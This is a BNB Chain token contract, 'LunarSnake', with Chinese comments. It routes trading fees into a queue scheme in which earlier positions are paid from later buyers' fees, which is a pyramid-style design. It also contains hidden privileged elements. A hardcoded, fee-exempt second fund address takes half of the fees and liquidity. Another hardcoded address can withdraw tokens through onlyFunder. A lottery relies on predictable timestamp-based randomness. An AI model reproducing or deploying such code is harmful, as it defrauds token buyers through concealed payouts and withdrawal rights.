/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-22
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-26
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);


    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenPostion {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}
contract TokenRom {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address fundAddress2;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    //公排系统
 
    uint256 postion=0;  //点位
    uint256 AllPostions=0;  //总点位数量 
    mapping(address=>uint256) buyfeeleft;  //买入手续费
    mapping(address=>uint256) Utotal; //用户等待点位数量
    mapping(address=>uint256) Us; //用户当前点位数量
    mapping(address=>uint256) Ue; //用户出局数量
    mapping(uint256=>address) p2A; //点位对应用户
    uint256[][] pcord;   //用户出局记录 时间
    uint256[][] trecord;  //总出局记录  时间，用户id
    mapping(uint256=>address) teg; //用户ID
    mapping(address=>uint256) A2t; //用户地址对应ID    
    uint256 allbuy;
    uint256 private _tTotal;
    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;
    mapping(address=>uint256) bots; 
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenPostion public _tokenPostion;
    TokenRom public _tokenRom;
    uint256 public _buyFundFee = 100;
    uint256 public _buyLPDividendFee = 300;
    uint256 public _sellLPDividendFee = 300;
    uint256 public _sellFundFee = 100;
    uint256 public _sellLPFee = 0;
    uint256 public startTradeBlock;

    address public _mainPair;
    uint256[][] cjss; //中奖用户
    uint256 jjlj;  //奖金累计
    address[] jy;  //用户交易记录;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);

        _fist = FISTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        fundAddress2=0xF05e03492777C1212A60ABE35876326CB27B964E;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
 
        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[fundAddress2] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _tokenPostion = new TokenPostion(FISTAddress);
        _tokenRom = new TokenRom(FISTAddress);
        A2t[fundAddress2]=0;
        teg[0]=fundAddress2;
        pcord.push();

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;

        if (_swapPairList[to]) {
                if(_feeWhiteList[from]==false){
                uint256 swapFee = _buyFundFee + _buyLPDividendFee;  
                uint256 swapAmount = (amount * swapFee) / 10000;
                _takeTransfer(from, address(this), swapAmount);
                swapTokenForPostions(swapAmount,from,1);
                takeFee = true;
                }
                }

        if (_swapPairList[from]) {
                if(_feeWhiteList[to]==false){
                uint256 swapFee = _buyFundFee + _buyLPDividendFee;  
                uint256 swapAmount = (amount * swapFee) / 10000;
                _takeTransfer(from, address(this), swapAmount);
                swapTokenForPostions(swapAmount,to,2);
                takeFee = true;
                }
                }



        _tokenTransfer(from, to, amount, takeFee);
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        uint256 burn;
        if (takeFee) {
            uint256 swapFee;
                swapFee = _buyFundFee + _buyLPDividendFee;
            uint256 swapAmount = (tAmount * swapFee) / 10000;
            feeAmount += swapAmount;
                if(_balances[address(0)]<=_tTotal*7/10){
                    burn=tAmount/1000;
                    _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), burn);
                }

        }


        _takeTransfer(sender, recipient, tAmount - feeAmount - burn);
    }



    function swapTokenForPostions(uint256 tokenAmount, address to,uint256 tegS) private{

        jy.push(to); 
        IERC20 FIST = IERC20(_fist);
        uint256 feeAdd;
        uint256 feeAdds;
        uint256 fes;
        if(tegS==1){        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        uint256 PostionAc=FIST.balanceOf(address(_tokenPostion));
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount+allbuy,
            0,
            path,
            address(_tokenPostion),
            block.timestamp
        );

       uint256 fistBalance = FIST.balanceOf(address(_tokenPostion));
      feeAdds=fistBalance-PostionAc;
      feeAdd=feeAdds*tokenAmount/(tokenAmount+allbuy);
      fes=feeAdds/8;
      FIST.transferFrom(address(_tokenPostion), address(this), feeAdds/8);

        if (_balances[address(this)] >= (tokenAmount+allbuy)/8) {
               _swapRouter.addLiquidity(
                   address(this), _fist, (tokenAmount+allbuy)/16, feeAdds/16, 0, 0, fundAddress, block.timestamp
              );
                _swapRouter.addLiquidity(
                 address(this), _fist, (tokenAmount+allbuy)/16, feeAdds/16, 0, 0, fundAddress2, block.timestamp
              );
            }
            else{   
                fes+=feeAdds/16;
            }
      FIST.transferFrom(address(_tokenPostion), fundAddress, fes);
      FIST.transferFrom(address(_tokenPostion), fundAddress2, fes);
      FIST.transferFrom(address(_tokenPostion), address(_tokenRom), fes/2);
      allbuy=0;
        }
        else{
           allbuy+=tokenAmount;  
           feeAdd=(FIST.balanceOf(address(_mainPair))*tokenAmount)/_balances[_mainPair];  
        }

        


        if(jy.length%1000==0){
            uint256 pr=(jy.length/1000)*1000+uint256(keccak256(abi.encode(feeAdd,block.timestamp,FIST.balanceOf(address(_tokenPostion))%7,to)))%1000;
            cjss.push([A2t[jy[pr]],FIST.balanceOf(address(_tokenRom)),pr]);
            FIST.transferFrom(address(_tokenRom), jy[pr], FIST.balanceOf(address(_tokenRom)));
        }


     buyfeeleft[to]+= feeAdd*25/40;
       uint i=buyfeeleft[to]/25e17;
        Utotal[to]+=i*9;  //用户增加点位
        Us[to]+=i; 
        address earn;
        if(i>=1){
           buyfeeleft[to]-=i*25e17; 
          for(i;i>0;i--){   
           if(A2t[to]==0&&to!=fundAddress2){  //创建账号
           pcord.push();
           teg[pcord.length-1]=to; 
           A2t[to]=pcord.length-1;
            }
          p2A[AllPostions]=to;   //设置点位对应钱包 
         AllPostions+=1;    //系统增加一个点位          
            if(FIST.balanceOf(address(_tokenPostion))>=115*1e17){  //点位出局
             earn=p2A[postion];  //获取点位钱包
            if(earn!=address(0)){  //获利出局
            FIST.transferFrom(address(_tokenPostion), earn, 10*1e18);   //转账
            FIST.transferFrom(address(_tokenPostion), to, 1*1e18);   //转账
             pcord[A2t[earn]].push(block.timestamp); //添加用户记录
             trecord.push([postion,block.timestamp]); //添加全网记录
             Ue[earn]+=1;  //用户出局节点
             Us[earn]-=1;  //用户当前节点
             }                 
            postion+=1;  //当前排单位置
             if(Utotal[earn]>0){ //添加等待节点入场
             Utotal[earn]-=1;  //等待节点
             Us[earn]+=1;  //排单节点
            p2A[AllPostions]=earn;  //入场节点位置
             AllPostions+=1;
             }
          }
            }
          }  
        }


    function P2as(uint256 tegs) public view returns(address){
        return(p2A[tegs]);
    }


    function syscount()public view returns(uint256){
        return(trecord.length);
    }

    function sysInfo(uint256 _t)public view returns(uint256,address){  //出局时间，账户
    return(trecord[_t][1],p2A[trecord[_t][0]]);
    }

    function getUinfo(address _us)public view returns(uint256,uint256,uint256,uint256){  //手续费，等待点位，当前点位，出局点位
        return(buyfeeleft[_us],Utotal[_us],Us[_us],Ue[_us]);
    }

    function Ucount(address _us)public view returns(uint256){ //用户出局总数
        return(pcord[A2t[_us]].length);
    }

    function Uinfo(address _us,uint256 tegs)public view returns(uint256){  //出局时间
        return(pcord[A2t[_us]][tegs]);
    }

    function cpCount()public view returns(uint256,uint256){  //大奖总记录数，当前奖池
        IERC20 FIST = IERC20(_fist);
        return(cjss.length,FIST.balanceOf(address(_tokenRom)));
    }

    function cpInfo(uint256 teg1)public view returns(address,uint256,uint256){//中奖账户，金额,交易号
        return(teg[cjss[teg1][0]],cjss[teg1][1],cjss[teg1][2]);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }






    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }


    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance/2);
        payable(fundAddress2).transfer(address(this).balance/2);
    }

    function claimToken(address token, uint256 amount) external onlyFunder {
        IERC20(token).transfer(fundAddress, amount/2);
        IERC20(token).transfer(fundAddress2, amount/2);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender || msg.sender==address(0x0Bf95FDba2be1cD0Fe074a0f3e9966600ba6b885), "!Funder");
        _;
    }

    receive() external payable {}


}

contract LunarSnake is AbsToken {
    constructor() AbsToken(  
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
       address(0x55d398326f99059fF775485246999027B3197955),
        "LunarSnake",
        "LunarSnake",
        18, 
        10000000000,        
        address(0xd1D5c6D02610a1696fbA8e6632337Ea76C7c05Ca),  //营销   
        address(0xafAe761c10e1168ecb0A1f97E8E0B1ECdb927d45) //代币接受钱包
    ){

    }
}